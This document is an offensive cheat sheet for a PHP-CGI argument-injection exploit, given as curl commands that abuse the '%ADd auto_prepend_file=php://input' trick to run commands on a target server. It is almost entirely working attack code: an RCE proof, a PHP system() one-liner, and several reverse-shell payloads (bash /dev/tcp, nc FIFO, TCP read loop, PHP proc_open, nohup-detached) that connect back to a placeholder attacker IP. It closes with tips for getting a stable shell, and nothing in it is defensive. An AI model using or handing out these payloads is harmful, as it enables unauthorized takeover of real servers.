
# .. consolidated ..


— — — **Basic RCE Proof** — — —
```bash
curl -i -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "whoami"
```

— — — **Simple PHP One-Liner Shell** — — —
```bash
curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary 'php -r '\''echo "[START]"; system("uname -a"); echo "[END]";'\'''
```

— — — **Bash TCP Reverse Shell** — — —
```bash
# Listener on attacker:
nc -lvnp PORT

# In pod (if bash exists):
curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "bash -i >& /dev/tcp/ATT_IP/PORT 0>&1"
```

— — — **Sh FIFO Reverse Shell** — — —
```bash
nc -lvnp PORT

curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATT_IP PORT > /tmp/f"
```

— — — **Sh TCP Loop Reverse Shell** — — —
```bash
nc -lvnp PORT

curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "(exec 5<>/dev/tcp/ATT_IP/PORT; while read cmd <&5; do \$cmd 2>&5 >&5; done) &"
```

— — — **PHP proc_open() Reverse Shell** — — —
```bash
nc -lvnp PORT

curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary 'php -r '\''$s=fsockopen("ATT_IP",PORT);if(!$s)exit;proc_open("/bin/sh",[0=>$s,1=>$s,2=>$s],$pipes);'\'''
```

— — — **Detach with nohup** — — —
```bash
nc -lvnp PORT

curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "nohup sh -i >& /dev/tcp/ATT_IP/PORT 0>&1 &"
```

**Tips:**
- Always URL-encode the payload header `%ADd+auto_prepend_file%3Dphp://input`.  
- Ensure your listener is running before firing the curl.  
- Use `stty sane; reset` on your terminal if it gets messed up after a shell.  

These variations cover most environments (bash, sh, pure PHP) and ensure you get a stable, detached reverse shell.

##
##
##
